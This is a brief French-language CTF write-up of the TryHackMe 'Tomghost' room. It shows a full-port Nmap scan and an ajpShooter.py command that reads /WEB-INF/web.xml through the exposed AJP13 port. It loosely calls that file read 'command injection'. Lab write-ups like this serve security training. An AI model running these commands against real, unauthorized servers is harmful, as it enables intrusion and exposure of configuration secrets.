<h1>Tomghost ~ Writeup</h1>
<h2>Reconnaissance</h2>
<p>On débute le challenge par un scan Nmap</p>
<code>nmap -sC -sV -p- -Pn <TARGET_IP></code>
<img src="https://github/H4shVulca1n/Challenges/TryHackMe/tomghost/writeup_files/nmap.png>
<p>Nous identifions les services suivants :</p>
<ul>
	<li>OpenSSH (22)</li>
	<li>? (53)</li>
	<li>Ajp13 (8009)</li>
	<li>Apache Tomcat (8080)</li>
</ul>
<p>Il s'avère que le service Ajp13 soit vulnérable aux injections de commandes</p>
<h2>Exploitation</h2>
<p>Grâce à l'exploit déniché plus tôt, nous allons pouvoir lir certaines ressources normalement innaccessible par le commun des mortels...notamment un fichier de configuration XML du service Ajp13</p>
<code>python3 ajpShooter.py http://<TARGET_IP>:<HTTP_PORT> <AJP_PORT> /WEB-INF/web.xml read</code>
<img src="https://github/H4shVulca1n/Challenges/TryHackMe/tomghost/writeup_files/ajpShooter.png>
